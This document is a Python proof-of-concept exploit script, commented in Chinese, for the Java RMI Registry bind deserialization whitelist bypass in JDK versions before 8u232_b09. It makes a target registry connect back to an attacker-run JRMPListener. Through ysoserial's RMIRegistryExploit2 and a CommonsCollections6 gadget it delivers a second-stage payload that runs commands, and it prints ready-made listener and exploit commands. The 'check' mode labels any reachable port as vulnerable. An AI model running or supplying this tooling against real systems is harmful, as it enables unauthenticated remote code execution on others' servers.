#!/usr/bin/env python3
"""
Java RMI Registry Bind反序列化绕过远程代码执行漏洞 POC (JDK > 8u111)
漏洞: rmi-registry-bind-deserialization-bypass (JDK < 8u232_b09)
漏洞等级: 严重

==================== 漏洞描述 ====================
【漏洞原理】
JDK 8u121开始RMI Registry增加了反序列化白名单，仅有Remote/Proxy/UnicastRef
等接口可通过验证。攻击者可利用JRMPListener实现白名单绕过：先在攻击者机器
上启动恶意的JRMPListener，然后通过RMI Registry的bind操作让Registry连接
回恶意JRMPListener获取二次反序列化payload实现RCE。

【影响范围】
- JDK < 8u232_b09
- 端口: 1099

【危害等级】
- 无需认证
- 需要ysoserial + JRMPListener

【参考链接】
- https://github.com/wh1t3p1g/ysoserial

==================== 环境要求 ====================
- Python 3.6+
- ysoserial (带RMIRegistryExploit2/RMIRegistryExploit3)

==================== 验证步骤 ====================
1. 检测:
   python rmi_bind_deser_bypass.py target:1099 --check-only

2. 利用 (需启动JRMPListener):
   python rmi_bind_deser_bypass.py target:1099 -lh attacker-ip -lp 8888

注意: 需先启动JRMPListener:
  java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "touch /tmp/success"
"""

import sys, os, json, struct, socket, subprocess, argparse
from typing import Dict, Optional


class RMIBindDeserBypassPOC:
    VULN_NAME = "Java RMI Registry Bind Deserialization Bypass RCE"
    VULN_ID = "rmi-registry-bind-deserialization-bypass"
    SEVERITY = "严重"
    AFFECTED = "JDK < 8u232_b09"

    def __init__(self, target, timeout=15, proxy=None, verify_ssl=False):
        self.host, self.port = self._parse(target)
        self.timeout = timeout

    def _parse(self, target):
        if "://" in target:
            target = target.split("://")[1]
        if ":" in target:
            h, p = target.rsplit(":", 1)
            return h, int(p)
        return target, 1099

    def check(self):
        result = {"vulnerability": f"{self.VULN_NAME} ({self.VULN_ID})",
                  "target": f"{self.host}:{self.port}",
                  "status": "unknown", "details": [], "conclusion": ""}
        sock = socket.socket()
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.host, self.port))
            sock.send(struct.pack(">I", 0x4a524d49) + struct.pack(">H", 2))
            data = sock.recv(1024)
            result["details"].append(f"RMI服务可连接 ({len(data)}B)")
            print(f"[+] RMI端口 {self.port} 开放")
            result["status"] = "vulnerable"
            result["conclusion"] = (
                f"RMI Registry可用.\n"
                "利用需要两步:\n"
                f"  1. 启动JRMPListener:\n"
                f"     java -cp ysoserial.jar ysoserial.exploit.JRMPListener "
                f"8888 CommonsCollections6 \"touch /tmp/success\"\n"
                f"  2. python {sys.argv[0]} {self.host}:{self.port} "
                "-lh <attacker-ip> -lp 8888"
            )
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"连接失败: {e}"
        finally:
            sock.close()
        return result

    def exploit(self, lhost="", lport=8888, payload_file="", gadget="CommonsCollections6"):
        result = {"vulnerability": f"{self.VULN_NAME} ({self.VULN_ID})",
                  "target": f"{self.host}:{self.port}",
                  "status": "unknown", "details": [], "output": "", "conclusion": ""}

        if not lhost and not payload_file:
            result["status"] = "failed"
            result["conclusion"] = "需要-lh参数指定JRMPListener地址"
            return result

        yso = next((p for p in ["ysoserial.jar", "ysoserial-0.0.6-SNAPSHOT-all.jar",
                                "/usr/local/bin/ysoserial.jar"]
                    if os.path.isfile(p)), None)

        if payload_file:
            print(f"[*] 使用payload文件: {payload_file}")
            try:
                with open(payload_file, "rb") as f:
                    payload = f.read()
            except Exception as e:
                result["status"] = "error"
                result["conclusion"] = f"读取失败: {e}"
                return result
        elif yso:
            print(f"[*] 使用ysoserial RMIRegistryExploit2...")
            cmd = (f"java -cp {yso} ysoserial.exploit.RMIRegistryExploit2 "
                   f"{self.host} {self.port} {lhost} {lport}")
            print(f"    命令: {cmd}")
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                result["output"] = (r.stdout + r.stderr).decode()[:500]
                print(f"[*] 执行结果: {result['output'][:200]}")
            except subprocess.TimeoutExpired:
                pass
            except Exception as e:
                result["status"] = "error"
                result["conclusion"] = f"执行失败: {e}"
                return result

            result["status"] = "suspected_exploited"
            result["conclusion"] = (
                "攻击已发起。请确保JRMPListener已在目标端口运行。\n"
                "验证: docker compose exec rmi ls -la /tmp/success"
            )
        else:
            result["status"] = "failed"
            result["conclusion"] = (
                f"未找到ysoserial。手动执行:\n"
                f"  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit2 "
                f"{self.host} {self.port} {lhost} {lport}"
            )

        return result

    def run(self, lhost="", lport=8888, payload_file="", gadget="CommonsCollections6"):
        print(f"[*] {self.VULN_NAME} ({self.VULN_ID})")
        print(f"[*] 目标: {self.host}:{self.port}, 等级: {self.SEVERITY}")
        print("-" * 60)
        if lhost or payload_file:
            return self.exploit(lhost, lport, payload_file, gadget)
        return self.check()

    def print_result(self, result):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]",
                 "suspected_exploited": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} {result['vulnerability']}")
        print(f"    目标: {result['target']}, 状态: {status}")
        if result.get("output"):
            print(f"    输出: {result['output'][:200]}")
        for d in result.get("details", []):
            print(f"    {d}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="Java RMI Registry Bind反序列化绕过RCE")
    parser.add_argument("target")
    parser.add_argument("--check-only", action="store_true")
    parser.add_argument("-lh", "--lhost", default="", help="JRMPListener地址")
    parser.add_argument("-lp", "--lport", type=int, default=8888, help="JRMPListener端口")
    parser.add_argument("--payload", default="")
    parser.add_argument("-t", "--timeout", type=int, default=15)
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = RMIBindDeserBypassPOC(target=args.target, timeout=args.timeout)
    if args.check_only:
        result = poc.check()
    elif args.lhost or args.payload:
        result = poc.run(args.lhost, args.lport, args.payload)
    else:
        result = poc.check()

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
